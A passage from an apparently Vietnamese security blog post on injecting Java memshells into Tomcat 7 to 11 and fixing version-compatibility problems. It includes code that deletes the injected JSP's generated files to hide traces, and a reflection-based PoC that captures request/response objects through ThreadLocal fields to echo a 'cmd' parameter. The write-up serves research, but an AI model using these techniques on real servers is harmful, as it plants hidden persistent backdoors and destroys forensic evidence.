<p>Ta cần xóa các file này trên disk. Mình có tham khảo được <a href="https://xz.aliyun.com/t/10372">bài này</a> về cách lấy absolute path của <code>java/class</code> file được generate từ <code>JspCompilationContext</code>. Tuy nhiên cách này code đang được viết khá dài dòng cũng như không tương thích giữa tomcat 7 với 8/9 do package name <code>MappingData</code> bị thay đổi. Ngoài ra cũng đang không xóa được compiled inner class:
<img src="/images/2024/Java-Memshell-Facing-Tomcat-compatibility/innner_class.png" alt="innner_class"></p>
<p>Well, long story short, it fixed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">&lt;%!</span>
</span></span><span style="display:flex;"><span>    Object <span style="color:#a6e22e">getFieldValue</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> String fieldName<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> obj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// CLEAN UP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Request req <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Request<span style="color:#f92672">)</span> getFieldValue<span style="color:#f92672">(</span>request<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;request&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    Wrapper wrapper <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Wrapper<span style="color:#f92672">)</span> getFieldValue<span style="color:#f92672">(</span>req<span style="color:#f92672">.</span><span style="color:#a6e22e">getMappingData</span><span style="color:#f92672">(),</span> <span style="color:#e6db74">&#34;wrapper&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Servlet jspServlet <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Servlet<span style="color:#f92672">)</span> getFieldValue<span style="color:#f92672">(</span>wrapper<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;instance&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    JspRuntimeContext jspRtCxt <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>JspRuntimeContext<span style="color:#f92672">)</span> getFieldValue<span style="color:#f92672">(</span>jspServlet<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;rctxt&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    ConcurrentHashMap jsps <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>ConcurrentHashMap<span style="color:#f92672">)</span> getFieldValue<span style="color:#f92672">(</span>jspRtCxt<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;jsps&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    JspServletWrapper jsw <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>JspServletWrapper<span style="color:#f92672">)</span> jsps<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getServletPath</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>    JspCompilationContext jspCompContext <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>JspCompilationContext<span style="color:#f92672">)</span> getFieldValue<span style="color:#f92672">(</span>jsw<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;ctxt&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Class<span style="color:#f92672">&lt;?&gt;</span> ic <span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredClasses</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span> <span style="color:#75715e">// inner class
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        String innerClsPath <span style="color:#f92672">=</span> jspCompContext<span style="color:#f92672">.</span><span style="color:#a6e22e">getClassFileName</span><span style="color:#f92672">().</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;.class&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;$&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span> ic<span style="color:#f92672">.</span><span style="color:#a6e22e">getSimpleName</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.class&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>innerClsPath<span style="color:#f92672">).</span><span style="color:#a6e22e">delete</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>jspCompContext<span style="color:#f92672">.</span><span style="color:#a6e22e">getClassFileName</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">delete</span><span style="color:#f92672">();</span><span style="color:#75715e">// .class
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>jspCompContext<span style="color:#f92672">.</span><span style="color:#a6e22e">getServletJavaFileName</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">delete</span><span style="color:#f92672">();</span> <span style="color:#75715e">// .java
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>application<span style="color:#f92672">.</span><span style="color:#a6e22e">getRealPath</span><span style="color:#f92672">(</span>jspCompContext<span style="color:#f92672">.</span><span style="color:#a6e22e">getJspFile</span><span style="color:#f92672">())).</span><span style="color:#a6e22e">delete</span><span style="color:#f92672">();</span> <span style="color:#75715e">// .jsp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    response<span style="color:#f92672">.</span><span style="color:#a6e22e">getWriter</span><span style="color:#f92672">().</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cleaned up!&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// END CLEAN UP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">%&gt;</span>
</span></span></code></pre></div><h2 id="vulnerabilities-type">vulnerabilities type</h2>
<h3 id="obtain-requestresponse-object---tomcat-echo-7-9">obtain request/response object - Tomcat echo 7-9</h3>
<p>Khác với JSP type, để chèn memshell qua các lỗ hổng thì không có sẵn các <code>request/response</code> object để có thể lợi dụng, cần lấy được các object này.</p>
<p>Mình có tìm hiểu <a href="https://xz.aliyun.com/t/7348">bài này</a> của tác giả <code>kingkk</code> để có thể lấy được các object trên thông qua <code>ThreadLocal</code>, đây là cách có độ ổn định khá cao.</p>
<p>Đầu tiên đặt breakpoint tại servlet và trace ngược về request khởi tạo thread:
<img src="/images/2024/Java-Memshell-Facing-Tomcat-compatibility/InjectServlet_doGet.java.png" alt="InjectServlet_doGet.java"></p>
<p>Bước tiếp theo cần tìm nơi có thể lấy được biến <code>request/response</code> trong call stack này, do các biến này thường được được pass dưới dạng parameters, cần tìm nơi mà các biến này được lưu lại trong thread. Các biến này cần phải là biến <code>ThreadLocal</code> mà không phải là global thì mới có thể lấy được thông tin của request thread hiện tại, ngoài ra cần là biến <code>static</code> nếu không ta phải lấy tiếp được instance của class chứa biến tại thời điểm tomcat lưu biến.</p>
<p>Tác giả tìm được tại class <code>org.apache.catalina.core.ApplicationFilterChain</code> có hai field thỏa mãn điều kiện trên:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// class: ApplicationFilterChain 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> ThreadLocal<span style="color:#f92672">&lt;</span>ServletRequest<span style="color:#f92672">&gt;</span> lastServicedRequest<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> ThreadLocal<span style="color:#f92672">&lt;</span>ServletResponse<span style="color:#f92672">&gt;</span> lastServicedResponse<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// class: ApplicationDispatcher
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> WRAP_SAME_OBJECT<span style="color:#f92672">;</span>
</span></span></code></pre></div><p>Hai field này sẽ lưu lại <code>request/response</code> object khi attribute <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code> là <code>true</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// class: ApplicationFilterChain 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">internalDoFilter</span><span style="color:#f92672">(</span>ServletRequest request<span style="color:#f92672">,</span> ServletResponse response<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ServletException <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    ServletResponse res<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// gọi filter tiếp theo nếu vẫn còn
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">pos</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">n</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// truncated
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span> <span style="color:#75715e">// đã hết filter chain -- gọi servlet instance
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ApplicationDispatcher<span style="color:#f92672">.</span><span style="color:#a6e22e">WRAP_SAME_OBJECT</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#75715e">// [1]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                lastServicedRequest<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>request<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                lastServicedResponse<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>response<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">support</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fireInstanceEvent</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;beforeService&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">servlet</span><span style="color:#f92672">,</span> request<span style="color:#f92672">,</span> response<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">isAsyncSupported</span><span style="color:#f92672">()</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">support</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getWrapper</span><span style="color:#f92672">().</span><span style="color:#a6e22e">isAsyncSupported</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                request<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.ASYNC_SUPPORTED&#34;</span><span style="color:#f92672">,</span> Boolean<span style="color:#f92672">.</span><span style="color:#a6e22e">FALSE</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>request <span style="color:#66d9ef">instanceof</span> HttpServletRequest <span style="color:#f92672">&amp;&amp;</span> response <span style="color:#66d9ef">instanceof</span> HttpServletResponse<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>Globals<span style="color:#f92672">.</span><span style="color:#a6e22e">IS_SECURITY_ENABLED</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    ServletRequest req <span style="color:#f92672">=</span> request<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    res <span style="color:#f92672">=</span> response<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    Principal principal <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>HttpServletRequest<span style="color:#f92672">)</span>req<span style="color:#f92672">).</span><span style="color:#a6e22e">getUserPrincipal</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                    Object<span style="color:#f92672">[]</span> args <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span>req<span style="color:#f92672">,</span> res<span style="color:#f92672">};</span>
</span></span><span style="display:flex;"><span>                    SecurityUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">doAsPrivilege</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;service&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">servlet</span><span style="color:#f92672">,</span> classTypeUsedInService<span style="color:#f92672">,</span> args<span style="color:#f92672">,</span> principal<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">servlet</span><span style="color:#f92672">.</span><span style="color:#a6e22e">service</span><span style="color:#f92672">(</span>request<span style="color:#f92672">,</span> response<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">servlet</span><span style="color:#f92672">.</span><span style="color:#a6e22e">service</span><span style="color:#f92672">(</span>request<span style="color:#f92672">,</span> response<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">support</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fireInstanceEvent</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;afterService&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">servlet</span><span style="color:#f92672">,</span> request<span style="color:#f92672">,</span> response<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IOException var19<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// truncated
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">finally</span> <span style="color:#f92672">{</span> <span style="color:#75715e">// [2]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ApplicationDispatcher<span style="color:#f92672">.</span><span style="color:#a6e22e">WRAP_SAME_OBJECT</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                lastServicedRequest<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">((</span>Object<span style="color:#f92672">)</span><span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                lastServicedResponse<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">((</span>Object<span style="color:#f92672">)</span><span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><ul>
<li>[1]: Lưu lại <code>request/response</code> object</li>
<li>[2]: tại finally block, khi servlet đã xử lý xong, set lại hai biến này về <code>null</code></li>
</ul>
<p>Dù attribute <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code> có giá trị mặc định là <code>false</code>, ta có thể dùng reflection để sửa attribute ở request đầu tiên, các request về sau khi giá trị này đã là <code>true</code>, ta có thể lấy được <code>request/response</code> object được lưu.</p>
<p>Một vài lưu ý trước khi build PoC.</p>
<ul>
<li>Do <code>lastServicedRequest</code>, <code>lastServicedResponse</code> và cả <code>WRAP_SAME_OBJECT</code> có thuộc tính <code>private</code> (hạn chế truy cập) và <code>final</code> (không thể chỉnh sửa), cần dùng reflection để gỡ.</li>
<li><code>ApplicationDispatcher.internalDoFilter()</code> là method nằm ở cuối filter chain để gọi đến servlet do đó nếu lỗ hổng nằm ở filter thì sẽ không dùng được cách này (do chưa reach đến). Lấy ví dụ lỗ hổng Shiro deserialization, phần deser nằm ở filter class.</li>
<li>Ngoài ra static block của class <code>ApplicationFilterChain</code> có khởi tạo hai biến <code>lastServicedRequest</code>, <code>lastServicedResponse</code> khi <code>WRAP_SAME_OBJECT</code> là <code>true</code>, nếu sửa thuộc tính này, cũng cần khởi tạo hai biến trên để tránh lỗi trong luồng thực thi:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// class: ApplicationFilterChain 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ApplicationDispatcher<span style="color:#f92672">.</span><span style="color:#a6e22e">WRAP_SAME_OBJECT</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        lastServicedRequest <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ThreadLocal<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        lastServicedResponse <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ThreadLocal<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        lastServicedRequest <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        lastServicedResponse <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// truncated
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>OK, my PoC:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MemEventListener</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    Field <span style="color:#a6e22e">getStaticFieldModified</span><span style="color:#f92672">(</span>String clsName<span style="color:#f92672">,</span> String fieldName<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span>clsName<span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Field modifiersF <span style="color:#f92672">=</span> Field<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;modifiers&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        modifiersF<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span> <span style="color:#75715e">// private
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        modifiersF<span style="color:#f92672">.</span><span style="color:#a6e22e">setInt</span><span style="color:#f92672">(</span>f<span style="color:#f92672">,</span> f<span style="color:#f92672">.</span><span style="color:#a6e22e">getModifiers</span><span style="color:#f92672">()</span> <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>Modifier<span style="color:#f92672">.</span><span style="color:#a6e22e">FINAL</span><span style="color:#f92672">);</span> <span style="color:#75715e">// final
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    MemEventListener<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            Field sameF <span style="color:#f92672">=</span> getStaticFieldModified<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationDispatcher&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;WRAP_SAME_OBJECT&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            Field requestF <span style="color:#f92672">=</span> getStaticFieldModified<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;lastServicedRequest&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            Field responseF <span style="color:#f92672">=</span> getStaticFieldModified<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;lastServicedResponse&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// sửa thuộc tính
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span><span style="color:#66d9ef">boolean</span><span style="color:#f92672">)</span>sameF<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                sameF<span style="color:#f92672">.</span><span style="color:#a6e22e">setBoolean</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                requestF<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span>  ThreadLocal <span style="color:#f92672">&lt;&gt;());</span>
</span></span><span style="display:flex;"><span>                responseF<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span>  ThreadLocal <span style="color:#f92672">&lt;&gt;());</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ServletRequest request <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>ThreadLocal<span style="color:#f92672">&lt;</span>ServletRequest<span style="color:#f92672">&gt;)</span> requestF<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">get</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            ServletResponse response <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>ThreadLocal<span style="color:#f92672">&lt;</span>ServletResponse<span style="color:#f92672">&gt;)</span> responseF<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">get</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span><span style="color:#a6e22e">getWriter</span><span style="color:#f92672">().</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>PoC này cần gửi hai request. Request đầu chỉ để sửa thuộc tính, từ request thứ 2 có thể lấy được <code>request/response</code> object.</p>
<p>Đã test và chạy tốt trên tomcat 7, 8, 9, lên tomcat 10, 11 lỗi.</p>
<h3 id="fix-compatibility-issues-with-tomcat-10-11">fix compatibility issues with tomcat 10, 11</h3>
<p>Khi inject sẽ có lỗi:</p>
<pre tabindex="0"><code>java.lang.NoSuchFieldException: WRAP_SAME_OBJECT
</code></pre><p>Nguyên nhân do từ tomcat 10 và 11, thuộc tính <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code> được chuyển sang <code>ApplicationFilterChain.dispatcherWrapsSameObject</code>, field này cũng không còn phải là static nên nếu muốn sửa đổi sẽ cần instance của <code>ApplicationFilterChain</code> :(</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// class: ApplicationFilterChain
